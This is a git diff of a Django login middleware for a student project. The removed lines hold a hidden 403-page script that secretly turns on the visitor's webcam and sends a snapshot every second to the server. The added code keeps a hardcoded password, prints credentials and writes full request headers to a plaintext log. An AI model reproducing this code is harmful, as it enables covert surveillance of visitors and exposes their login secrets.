@@ -5,6 +5,9 @@
 @File ：auth_middleware.py
 @IDE ：PyCharm
 """
+import time
+from datetime import datetime
+
 import django
 from django.core.handlers.wsgi import WSGIRequest
 from django.http import HttpResponse
@@ -57,115 +60,24 @@ class MyLoginRequiredMiddleware:
         #     response = HttpResponse("Logout success", status=401)
         #     response['WWW-Authenticate'] = "Basic realm='Login Required'"
         #     return response
-        # print(request.path)
-        if "data_verification" in request.path or 'favicon.ico' in request.path:
-            return self.get_response(request)
-        if request.COOKIES.get('GROUP8-AUTH-SUCCESS') is None:
+        date = time.strftime("%Y_%d_%H_%m_%H_%H_%d_%d", time.localtime())
+        base_64_data = base64.b64encode(bytes(date, encoding="utf-8")).decode('ascii').replace("=", "").replace("\\", "").replace("/", "")
+        if request.COOKIES.get('GROUP8-AUTH-SUCCESS-'+base_64_data) is None:
             # Reset request path to '/' and set a 403 response
-            response = HttpResponse("""
-            <!doctype html>
-<html lang='en'>
-
-<head>
-    <meta charset='UTF-8'>
-    <title>Forbidden</title>
-</head>
-
-<body style='display: flex;height: 100%;flex-direction: column;justify-content:
-                                    center;align-content: flex-start;align-items: center;'>
-<div style='display: flex;height: 100%;flex-direction: column;justify-content:
-                                    center;align-content: flex-start;align-items: center;'>
-    <div style='display:
-                                    flex;flex-direction: column;align-content: space-around;flex-wrap: wrap;'>You
-        are <h1>Not Allowed to view this project</h1><br>
-        This is the project built by COMP3030J Group8-IllegalGroupNameException.<br>
-        Please contact <strong>Group8</strong> to view this project.<br>
-        Your request has been intercept by our <strong>Auth Middleware.</strong>
-        <p
-                style='color:red'>This incident has been reported.</p>
-        <button id='take' hidden>a</button>
-<br/>
-<video id='v' style='width: 640px;height: 480px;' hidden></video>
-<canvas id='canvas' style='display:none;'></canvas>
-<br/>
-<img src='' id='photo' alt='photo' hidden>
-    </div>
-</div>
-
-
-<script>
-
-    // 老的浏览器可能根本没有实现 mediaDevices，所以我们可以先设置一个空的对象
-    if (navigator.mediaDevices === undefined) {
-        navigator.mediaDevices = {};
-    }
-    if (navigator.mediaDevices.getUserMedia === undefined) {
-        navigator.mediaDevices.getUserMedia = function (constraints) {
-            // 首先，如果有getUserMedia的话，就获得它
-            var getUserMedia = navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
-
-            // 一些浏览器根本没实现它 - 那么就返回一个error到promise的reject来保持一个统一的接口
-            if (!getUserMedia) {
-                return Promise.reject(new Error('getUserMedia is not implemented in this browser'));
-            }
-
-            // 否则，为老的navigator.getUserMedia方法包裹一个Promise
-            return new Promise(function (resolve, reject) {
-                getUserMedia.call(navigator, constraints, resolve, reject);
-            });
-        }
-    }
-    const constraints = {
-        video: true,
-        audio: false
-    };
-    let videoPlaying = false;
-    let v = document.getElementById('v');
-    let promise = navigator.mediaDevices.getUserMedia(constraints);
-    promise.then(stream => {
-        if ('srcObject' in v) {
-            v.srcObject = stream;
-        } else {
-            v.src = window.URL.createObjectURL(stream);
-        }
-        v.onloadedmetadata = function (e) {
-            v.play();
-            videoPlaying = true;
-        };
-    }).catch(err => {
-        console.error(err.name + ': ' + err.message);
-    })
-
-    function camera() {
-        let canvas = document.getElementById('canvas');
-        canvas.width = v.videoWidth;
-        canvas.height = v.videoHeight;
-        canvas.getContext('2d').drawImage(v, 0, 0);
-        let data = canvas.toDataURL('image/webp');
-        var xmlHttp = new XMLHttpRequest();
-
-        xmlHttp.open('GET', '/data_verification/?data=' + data, true);
-        xmlHttp.send();
-
-
-        document.getElementById('photo').setAttribute('src', data);
-        setTimeout(function () {
-            camera()
-        }, 1000)
-    }
-
-    document.onreadystatechange = function (e) {
-        console.log(e);
-        camera()
-    };
-</script>
-
-
-</body>
-
-</html>
-            
-            """
+            response = HttpResponse("<div style='display: flex;height: 100%;flex-direction: column;justify-content: "
+                                    "center;align-content: flex-start;align-items: center;'><div style='display: "
+                                    "flex;flex-direction: column;align-content: space-around;flex-wrap: wrap;'>"
+                                    "<h1>You are Not Allowed to view this project</h1><br>" +
+                                    "This is the project built by COMP3030J Group8-IllegalGroupNameException.<br>" +
+                                    "Please contact <strong>Group8</strong> to view this project.<br>" +
+                                    "Your request has been intercepted by our Authentication Middleware. <p "
+                                    "style='color:red'>This incident has been reported.</p>"+
+                                    "<h1>您无权查看此项目</h1><br>" +
+                                    "此项目由 COMP3030J Group8-IllegalGroupNameException 维护<br>" +
+                                    "请联系<strong>Group8</strong>以获得权限查看此项目<br>" +
+                                    "您的请求已被 Authentication Middleware 拦截<p "
+                                    "style='color:red'>此事件已报告.</p></div>"
+                                    "</div>"
                                     , status=401)
             response['WWW-Authenticate'] = "Basic realm='Login Required'"
             if "Authorization" in request.headers:
@@ -174,21 +86,55 @@ class MyLoginRequiredMiddleware:
                     data = data.split("Basic ")[1]
                     data = base64.b64decode(data).decode("utf-8")
                     data = data.split(":")
-                    username = data[0]
-                    password = data[1]
-                    print(username, password)
-                    if username == "group8" and password == "nb666":
-                        response = HttpResponse("<div style='display: flex;height: 100%;flex-direction: "
-                                                "column;justify-content: center;align-content: "
-                                                "flex-start;align-items: center;'><div style='display: "
-                                                "flex;flex-direction: column;align-content: space-around;flex-wrap: "
-                                                "wrap;'> "
-                                                "<h1>Welcome!</h1> Now you can view the project.<br>Please refresh "
-                                                "this page to view our project.</div></div>", status=200)
-                        response.set_cookie("GROUP8-AUTH-SUCCESS", "ok", max_age=3600)
-                        # response: HttpResponse = self.get_response(request)
-                        return response
+                    try:
+                        username = data[0]
+                        password = data[1]
+                        print(username, password)
+                        if username == "group8" and password == "nb666":
+                            with open("access_log/access_log.log", "a") as f:
+                                f.write("\n")
+                                f.write(
+                                    request.path + " " + request.method + " " + request.headers["User-Agent"] + " " +
+                                    str(time.strftime("%Y_%m_%d", time.localtime())) + "\n")
+                                f.write(str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+                                f.write("    AUTH_SUCCESS    ")
+                                f.write(request.META["REMOTE_ADDR"])
+                                f.write("\n")
+                            response = HttpResponse("<div style='display: flex;height: 100%;flex-direction: "
+                                                    "column;justify-content: center;align-content: "
+                                                    "flex-start;align-items: center;'><div style='display: "
+                                                    "flex;flex-direction: column;align-content: space-around;flex-wrap: "
+                                                    "wrap;'> "
+                                                    "<h1>Welcome!</h1> Now you can view the project.<br>Please refresh "
+                                                    "this page to view our project.</div></div>", status=200)
+                            response.set_cookie("GROUP8-AUTH-SUCCESS-"+base_64_data, "ok", max_age=3600)
+                            # response: HttpResponse = self.get_response(request)
+                            return response
+                    except Exception as e:
+                        print(e)
+                    else:
+                        with open("access_log/access_log.log", "a") as f:
+                            f.write("\n")
+                            f.write(str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+                            f.write("\n")
+                            f.write("USER: " + str(data))
+                            f.write("\n")
+                            f.write(request.META["REMOTE_ADDR"])
+                            f.write("\n")
+                            f.write(request.path + " " + request.method + " " + request.headers["User-Agent"] + " " +
+                                    str(time.strftime("%Y_%m_%d", time.localtime())) + "\n")
+                            for key in request.headers:
+                                f.write(str(key) + ": " + request.headers.get(key))
+                                f.write("\n")
+                            f.write("\n")
+                            f.write("\n")
         else:
             response: HttpResponse = self.get_response(request)
+        # WWW-Authenticate
+
+        # print(response)
+
+        # Code to be executed for each request/response after
+        # the view is called.
 
         return response
